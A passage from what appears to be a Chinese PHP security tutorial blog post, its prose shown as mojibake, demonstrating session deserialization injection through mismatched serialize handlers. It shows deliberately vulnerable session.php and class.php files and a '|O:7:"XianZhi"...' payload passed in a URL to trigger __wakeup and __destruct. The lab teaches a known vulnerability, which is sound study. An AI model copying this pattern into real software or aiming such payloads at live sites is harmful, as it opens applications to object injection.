<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…ˆçœ‹çœ‹<code>session</code>çš„åˆå§‹å†…å®¹ï¼Œå¦‚ä¸‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"session"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>å­˜åœ¨å¦ä¸€ä¸ª<code>class.php</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">XianZhi</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'panda'</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Who are you?"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XianZhi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åå®ä¾‹åŒ–å¯¹è±¡åï¼Œè¾“å‡º<code>panda</code></p>
<p>è¿™ä¸¤ä¸ªæ–‡ä»¶çš„ä½œç”¨å¾ˆæ¸…æ™°ï¼Œ<code>session.php</code>æ–‡ä»¶çš„å¤„ç†å™¨æ˜¯<code>php_serialize</code>ï¼Œ<code>class.php</code>æ–‡ä»¶çš„å¤„ç†å™¨æ˜¯<code>php</code>ï¼Œ<code>session.php</code>æ–‡ä»¶çš„ä½œç”¨æ˜¯ä¼ å…¥å¯æ§çš„ <code>session</code>å€¼ï¼Œ<code>class.php</code>æ–‡ä»¶çš„ä½œç”¨æ˜¯åœ¨ååºåˆ—åŒ–å¼€å§‹å‰è¾“å‡º<code>Who are you?</code>ï¼Œååºåˆ—åŒ–ç»“æŸçš„æ—¶å€™è¾“å‡º<code>name</code>å€¼ã€‚</p>
<p>è¿™ä¸¤ä¸ªæ–‡ä»¶å¦‚æœæƒ³è¦åˆ©ç”¨sessionååºåˆ—åŒ–æ¼æ´ ï¼Œæˆ‘ä»¬è¦åœ¨<code>session.php</code>æ–‡ä»¶ä¼ å…¥<code>|</code>+<code>åºåˆ—åŒ–</code>æ ¼å¼çš„å€¼ï¼Œç„¶åå†æ¬¡è®¿é—®<code>class.php</code>æ–‡ä»¶çš„æ—¶å€™ï¼Œå°±ä¼šåœ¨è°ƒç”¨<code>session</code>å€¼çš„æ—¶å€™ï¼Œè§¦å‘æ­¤ BUGã€‚</p>
<p>é¦–å…ˆç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">XianZhi</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Who are you?"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XianZhi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$str</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"xianzhi"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>payload</code>:<code>O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;</code></p>
<p>ç„¶åä¼ å…¥<code>session.php</code></p>
<p><code>url?seesion=|O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;</code></p>
<p>å†æ¬¡è®¿é—®<code>class.php</code>å</p>
<p>å‘ç°è§¦å‘æˆåŠŸ</p>
</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/07/02/%E5%88%9D%E8%AF%86CSRF%E5%92%8CSSRF/" rel="prev" title="åˆè¯†CSRFå’ŒSSRF"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">åˆè¯†CSRFå’ŒSSRF</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/07/01/PHP%E5%9F%BA%E7%A1%80/" rel="next" title="PHPåŸºç¡€"><span class="post-nav-text">PHPåŸºç¡€</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>æ‚¨éœ€è¦ç§‘å­¦ä¸Šç½‘ï¼Œæ‰å¯ä½¿ç”¨è¯„è®ºåŒºåŠŸèƒ½ã€‚</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank"></a></div><div class="copyright"><span>&copy; 2023 â€“ 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Npc</span></div><div class="footer-custom-text">=w=</div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>